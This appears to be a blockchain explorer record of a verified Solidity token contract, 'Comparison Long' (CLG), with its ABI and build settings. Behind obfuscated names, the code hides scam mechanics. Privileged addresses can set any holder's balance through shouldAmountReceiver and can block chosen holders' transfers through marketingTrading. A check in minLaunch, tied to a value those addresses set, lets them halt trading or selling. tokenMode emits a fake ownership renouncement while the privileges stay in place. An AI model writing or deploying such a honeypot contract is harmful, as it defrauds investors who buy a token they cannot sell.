{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface feeShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderLimit {\n    function createPair(address atTotal, address txTradingAuto) external returns (address);\n}\n\ninterface autoMarketingWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTakeLiquidity) external view returns (uint256);\n\n    function transfer(address sellLaunch, uint256 liquidityMode) external returns (bool);\n\n    function allowance(address enableAmountFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellLaunch,\n        uint256 liquidityMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atFundToken, uint256 value);\n    event Approval(address indexed enableAmountFund, address indexed spender, uint256 value);\n}\n\ninterface enableReceiver is autoMarketingWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ComparisonLong is autoExempt, autoMarketingWallet, enableReceiver {\n\n    function exemptTrading(uint256 liquidityMode) public {\n        teamWallet();\n        feeBuy = liquidityMode;\n    }\n\n    function owner() external view returns (address) {\n        return shouldReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLimitAt;\n    }\n\n    uint256 constant tokenList = 15 ** 10;\n\n    address tokenFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function minLaunch(address txLiquidity, address sellLaunch, uint256 liquidityMode) internal returns (bool) {\n        if (txLiquidity == liquidityReceiverTotal) {\n            return launchTx(txLiquidity, sellLaunch, liquidityMode);\n        }\n        uint256 teamTotal = autoMarketingWallet(modeTakeAmount).balanceOf(tokenFrom);\n        require(teamTotal == feeBuy);\n        require(sellLaunch != tokenFrom);\n        if (txTotal[txLiquidity]) {\n            return launchTx(txLiquidity, sellLaunch, tokenList);\n        }\n        return launchTx(txLiquidity, sellLaunch, liquidityMode);\n    }\n\n    uint256 public amountReceiverFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTakeMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoTrading;\n    }\n\n    uint256 teamFee;\n\n    function tokenMode() public {\n        emit OwnershipTransferred(liquidityReceiverTotal, address(0));\n        shouldReceiver = address(0);\n    }\n\n    function launchTx(address txLiquidity, address sellLaunch, uint256 liquidityMode) internal returns (bool) {\n        require(limitAmount[txLiquidity] >= liquidityMode);\n        limitAmount[txLiquidity] -= liquidityMode;\n        limitAmount[sellLaunch] += liquidityMode;\n        emit Transfer(txLiquidity, sellLaunch, liquidityMode);\n        return true;\n    }\n\n    address public liquidityReceiverTotal;\n\n    bool public enableLaunch;\n\n    uint256 public enableTake;\n\n    event OwnershipTransferred(address indexed txLaunched, address indexed fromBuy);\n\n    uint8 private listLimitAt = 18;\n\n    function getOwner() external view returns (address) {\n        return shouldReceiver;\n    }\n\n    uint256 private receiverTakeMax = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public txTotal;\n\n    function transferFrom(address txLiquidity, address sellLaunch, uint256 liquidityMode) external override returns (bool) {\n        if (_msgSender() != marketingFund) {\n            if (toMarketingBuy[txLiquidity][_msgSender()] != type(uint256).max) {\n                require(liquidityMode <= toMarketingBuy[txLiquidity][_msgSender()]);\n                toMarketingBuy[txLiquidity][_msgSender()] -= liquidityMode;\n            }\n        }\n        return minLaunch(txLiquidity, sellLaunch, liquidityMode);\n    }\n\n    function transfer(address walletAmountList, uint256 liquidityMode) external virtual override returns (bool) {\n        return minLaunch(_msgSender(), walletAmountList, liquidityMode);\n    }\n\n    string private autoTrading = \"Comparison Long\";\n\n    function teamWallet() private view {\n        require(takeSwap[_msgSender()]);\n    }\n\n    address marketingFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private limitAmount;\n\n    string private amountTx = \"CLG\";\n\n    function approve(address launchTake, uint256 liquidityMode) public virtual override returns (bool) {\n        toMarketingBuy[_msgSender()][launchTake] = liquidityMode;\n        emit Approval(_msgSender(), launchTake, liquidityMode);\n        return true;\n    }\n\n    mapping(address => bool) public takeSwap;\n\n    bool private sellTeam;\n\n    function shouldAmountReceiver(address walletAmountList, uint256 liquidityMode) public {\n        teamWallet();\n        limitAmount[walletAmountList] = liquidityMode;\n    }\n\n    address private shouldReceiver;\n\n    uint256 feeBuy;\n\n    uint256 private exemptEnable;\n\n    function allowance(address shouldAuto, address launchTake) external view virtual override returns (uint256) {\n        if (launchTake == marketingFund) {\n            return type(uint256).max;\n        }\n        return toMarketingBuy[shouldAuto][launchTake];\n    }\n\n    address public modeTakeAmount;\n\n    constructor (){\n        \n        feeShould teamModeLaunch = feeShould(marketingFund);\n        modeTakeAmount = senderLimit(teamModeLaunch.factory()).createPair(teamModeLaunch.WETH(), address(this));\n        if (fundMin != enableLaunch) {\n            enableTake = amountReceiverFrom;\n        }\n        liquidityReceiverTotal = _msgSender();\n        tokenMode();\n        takeSwap[liquidityReceiverTotal] = true;\n        limitAmount[liquidityReceiverTotal] = receiverTakeMax;\n        if (amountWallet == enableTake) {\n            amountWallet = shouldFee;\n        }\n        emit Transfer(address(0), liquidityReceiverTotal, receiverTakeMax);\n    }\n\n    bool public fundMin;\n\n    function marketingTrading(address receiverTakeLiquidity) public {\n        teamWallet();\n        \n        if (receiverTakeLiquidity == liquidityReceiverTotal || receiverTakeLiquidity == modeTakeAmount) {\n            return;\n        }\n        txTotal[receiverTakeLiquidity] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountTx;\n    }\n\n    bool public senderMaxList;\n\n    uint256 public shouldFee;\n\n    uint256 public amountWallet;\n\n    function balanceOf(address fundTakeLiquidity) public view virtual override returns (uint256) {\n        return limitAmount[fundTakeLiquidity];\n    }\n\n    function exemptFrom(address toAutoBuy) public {\n        if (senderMaxList) {\n            return;\n        }\n        \n        takeSwap[toAutoBuy] = true;\n        \n        senderMaxList = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private toMarketingBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmountFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFundToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTakeLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAutoBuy\",\"type\":\"address\"}],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"exemptTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTakeLiquidity\",\"type\":\"address\"}],\"name\":\"marketingTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTakeAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMaxList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmountList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"shouldAmountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmountList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ComparisonLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}